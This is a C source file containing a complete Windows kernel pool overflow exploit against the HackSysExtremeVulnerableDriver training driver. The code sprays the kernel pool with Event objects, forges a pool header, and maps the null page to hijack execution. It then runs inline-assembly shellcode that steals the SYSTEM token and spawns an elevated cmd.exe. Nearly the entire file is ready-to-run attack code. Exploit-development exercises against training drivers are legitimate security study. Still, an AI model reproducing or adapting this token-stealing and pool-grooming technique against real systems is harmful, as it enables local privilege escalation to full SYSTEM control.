#include<stdio.h>
#include<Windows.h>
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define PoolOverFlow 0x22200f
/************************************************************************/
/*                 Write by Thunder_J 2019.7                            */
/*                       PoolOverFlow                                   */
/************************************************************************/

HANDLE hDevice = NULL;

typedef NTSTATUS
(WINAPI* My_NtAllocateVirtualMemory)(
	IN HANDLE ProcessHandle,
	IN OUT PVOID* BaseAddress,
	IN ULONG ZeroBits,
	IN OUT PULONG RegionSize,
	IN ULONG AllocationType,
	IN ULONG Protect
);

My_NtAllocateVirtualMemory NtAllocateVirtualMemory = NULL;

static VOID ShellCode()
{
	_asm
	{
		//int 3
		pop edi
		pop esi
		pop ebx
		pushad
		mov eax, fs: [124h]		// Find the _KTHREAD structure for the current thread
		mov eax, [eax + 0x50]   // Find the _EPROCESS structure
		mov ecx, eax
		mov edx, 4				// edx = system PID(4)

		// The loop is to get the _EPROCESS of the system
		find_sys_pid :
					 mov eax, [eax + 0xb8]	// Find the process activity list
					 sub eax, 0xb8    		// List traversal
					 cmp[eax + 0xb4], edx    // Determine whether it is SYSTEM based on PID
					 jnz find_sys_pid

					 // Replace the Token
					 mov edx, [eax + 0xf8]
					 mov[ecx + 0xf8], edx
					 popad
					 //int 3
					 ret
	}
}

BOOL init()
{
	// Get HANDLE
	hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_READ | GENERIC_WRITE,
		NULL,
		NULL,
		OPEN_EXISTING,
		NULL,
		NULL);

	printf("[+]Start to get HANDLE...\n");
	if (hDevice == INVALID_HANDLE_VALUE || hDevice == NULL)
	{
		return FALSE;
	}
	printf("[+]Success to get HANDLE!\n");
	return TRUE;
}

HANDLE Event_OBJECT[0x1000];

VOID Pool_Spray()
{
	for (int i = 0; i < 0x1000; i++)
		Event_OBJECT[i] = CreateEventA(NULL, FALSE, FALSE, NULL);

	for (int i = 0; i < 0x1000; i++)
	{
		// 0x40 * 8 = 0x200
		for (int j = 0; j < 8; j++)
			CloseHandle(Event_OBJECT[i + j]);
		i += 8;
	}
}

static VOID CreateCmd()
{
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
	BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)& si, &pi);
	if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
}

VOID Trigger_shellcode()
{
	DWORD bReturn = 0;
	// PoolSize + ModifySize = 0x1f8 + 0x28
	const int ModifySize = 0x28;
	const int PoolSize = 0x1f8;
	char buf[0x220];

	memset(buf, 0x41, 0x1f8);

	printf("[+]Started to construct pool...\n");
	*(DWORD*)(buf + PoolSize + 0x00) = 0x04080040;
	*(DWORD*)(buf + PoolSize + 0x04) = 0xee657645;
	*(DWORD*)(buf + PoolSize + 0x08) = 0x00000000;
	*(DWORD*)(buf + PoolSize + 0x0c) = 0x00000040;
	*(DWORD*)(buf + PoolSize + 0x10) = 0x00000000;
	*(DWORD*)(buf + PoolSize + 0x14) = 0x00000000;
	*(DWORD*)(buf + PoolSize + 0x18) = 0x00000001;
	*(DWORD*)(buf + PoolSize + 0x1c) = 0x00000001;
	*(DWORD*)(buf + PoolSize + 0x20) = 0x00000000;
	*(DWORD*)(buf + PoolSize + 0x24) = 0x00080000; // TypeInfo => 0x0

	printf("[+]Success to construct pool!\n");

	PVOID	Zero_addr = (PVOID)1;
	SIZE_T	RegionSize = 0x1000;

	*(FARPROC*)& NtAllocateVirtualMemory = GetProcAddress(
		GetModuleHandleW(L"ntdll"),
		"NtAllocateVirtualMemory");

	if (NtAllocateVirtualMemory == NULL)
	{
		printf("[+]Failed to get function NtAllocateVirtualMemory!!!\n");
		system("pause");
		return 0;
	}

	printf("[+]Started to alloc zero page...\n");
	if (!NT_SUCCESS(NtAllocateVirtualMemory(
		INVALID_HANDLE_VALUE,
		&Zero_addr,
		0,
		&RegionSize,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE)) || Zero_addr != NULL)
	{
		printf("[+]Failed to alloc zero page!\n");
		system("pause");
		return 0;
	}

	printf("[+]Success to alloc zero page...\n");
	*(DWORD*)(0x60) = (DWORD)& ShellCode;
	
	Pool_Spray();
	DeviceIoControl(hDevice, PoolOverFlow, buf, (PoolSize+ModifySize), NULL, 0, &bReturn, NULL);
	
	for (int i = 0; i < 0x1000; i++)
	{
		if (Event_OBJECT[i]) CloseHandle(Event_OBJECT[i]);
	}
}

int main()
{

	if (init() == FALSE)
	{
		printf("[+]Failed to get HANDLE!!!\n");
		system("pause");
		return 0;
	}

	Trigger_shellcode();
	//__debugbreak();

	printf("[+]Start to Create cmd...\n");
	CreateCmd();
	system("pause");

	return 0;
}